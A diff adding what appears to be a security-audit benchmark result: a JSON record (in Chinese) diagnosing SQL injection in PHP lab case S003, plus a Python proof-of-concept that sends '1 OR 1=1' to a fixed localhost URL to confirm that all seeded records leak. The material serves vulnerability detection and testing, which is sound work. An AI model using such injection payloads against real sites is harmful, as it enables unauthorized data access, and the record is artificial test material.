@@ -1,0 +1,103 @@
+```json
+{
+  "sample_id": "S003",
+  "prediction": "vulnerable",
+  "vulnerability_type": "SQL注入",
+  "locations": [
+    "F01:0007",
+    "F01:0010",
+    "F01:0011",
+    "F01:0012"
+  ],
+  "evidence": {
+    "source": "F01:0007 读取外部 GET 参数 $_GET['id']，默认空字符串，无需登录即可控制。",
+    "flow": "F01:0007 的 $id 在 F01:0010 被原样拼接到 WHERE id = 后形成 SQL 语法结构，F01:0011 执行该 SQL，F01:0012 取回记录。",
+    "guard": "无效：F01:0007 到 F01:0011 未见类型转换、白名单、转义或 mysqli 预处理绑定；F01:0010 直接拼接，输入可改变 WHERE 条件。",
+    "sink": "F01:0011 $db->query($sql) 执行拼接后的 SQL；F01:0012 读取结果并由 F01:0022-F01:0023 展示。"
+  },
+  "prerequisites": [
+    "PHP + MariaDB 按 runtime_context 运行，入口 http://127.0.0.1:4280/lab_cases/S003/index.php 可访问。",
+    "common/db_connect.php 提供已连接的 mysqli 变量 $db，且 lab_people 已按 runtime_context 预置 1 Alice、2 Bob、3 Carol。",
+    "GET 参数 id 可由本地请求控制，无需登录。",
+    "本地验证脚本只访问 127.0.0.1:4280，不修改数据库数据。"
+  ],
+  "missing_context": [
+    "common/db_connect.php 的具体连接实现未包含在代码输入包中；按 runtime_context 声明 $db 可用，不猜测其额外过滤实现。",
+    "未提供数据库初始化脚本和实际表内容；本地验证依赖 runtime_context 中 lab_people 的预置记录。",
+    "未提供 Web 服务器、中间件或 WAF 配置；若存在额外输入过滤，会影响本地验证结果。"
+  ],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "当前仅完成模型分析，脚本未执行；运行后若输出 VULNERABLE 才表示本地触发。脚本固定目标为 http://127.0.0.1:4280/lab_cases/S003/index.php，不接收任意主机，并拒绝重定向。普通业务对照：请求 id=1，预期解析出的业务记录仅为 [(1,Alice)]。测试步骤：请求 id=1 OR 1=1，预期解析出的业务记录为 [(1,Alice),(2,Bob),(3,Carol)]，因为输入被拼入 WHERE id = 后改变条件。预期安全影响：同一页面泄露 lab_people 中其他记录；数据库数据不应被修改。观察者应在浏览器看到普通请求仅 Alice，测试请求显示 Alice/Bob/Carol；数据库应无变化。失败时检查服务是否在 127.0.0.1:4280、db_connect.php 是否连接成功、lab_people 是否预置、HTML 结构是否匹配、是否存在额外过滤或 SQL 报错。防护建议：使用 mysqli 预处理绑定并把 id 限定为整数；这些是修复建议，不是已验证事实。"
+}
+```
+
+```python
+import urllib.request
+import urllib.parse
+import urllib.error
+import re
+import html
+import sys
+
+BASE = "http://127.0.0.1:4280/lab_cases/S003/index.php"
+
+class NoRedirect(urllib.request.HTTPRedirectHandler):
+    def redirect_request(self, req, fp, code, msg, headers, newurl):
+        raise urllib.error.HTTPError(
+            req.full_url, code, "重定向被拒绝: " + newurl, headers, fp
+        )
+
+opener = urllib.request.build_opener(NoRedirect)
+
+def fetch(id_value):
+    url = BASE + "?" + urllib.parse.urlencode({"id": id_value})
+    req = urllib.request.Request(url, headers={"User-Agent": "S003-audit-poc"})
+    with opener.open(req, timeout=5) as resp:
+        raw = resp.read()
+        charset = resp.headers.get_content_charset() or "utf-8"
+    text = raw.decode(charset, errors="replace")
+    records = []
+    pattern = r'<p>\s*ID\s*([^<：:]+?)\s*[：:]\s*([^<]*)</p>'
+    for m in re.finditer(pattern, text, flags=re.I):
+        records.append((
+            html.unescape(m.group(1).strip()),
+            html.unescape(m.group(2).strip())
+        ))
+    return records
+
+def main():
+    try:
+        normal = fetch("1")
+        if normal != [("1", "Alice")]:
+            print("FAIL 普通对照记录:", normal)
+            print("检查：服务是否在127.0.0.1:4280、db_connect.php是否连接成功、lab_people是否预置、HTML结构是否匹配。")
+            return 2
+
+        test = fetch("1 OR 1=1")
+        expected = [("1", "Alice"), ("2", "Bob"), ("3", "Carol")]
+
+        print("普通记录:", normal)
+        print("测试记录:", test)
+
+        if test == expected:
+            print("VULNERABLE: 测试输入返回全部预置业务记录，SQL注入在本地触发。")
+            print("数据库应无变化；浏览器普通请求显示Alice，测试请求显示Alice/Bob/Carol。")
+            return 0
+
+        if set(test) >= set(expected):
+            print("VULNERABLE: 测试输入至少返回全部预置业务记录；顺序或额外记录需人工核对。")
+            print("数据库应无变化；浏览器普通请求显示Alice，测试请求至少显示Alice/Bob/Carol。")
+            return 0
+
+        print("NOT_CONFIRMED: 测试记录未达预期；检查输入过滤、SQL报错、数据库内容或HTML结构。")
+        return 1
+
+    except Exception as e:
+        print("FAIL 请求异常:", repr(e))
+        print("检查服务可达、无跨主机重定向、db_connect.php和数据库初始化。")
+        return 2
+
+if __name__ == "__main__":
+    sys.exit(main())
+```
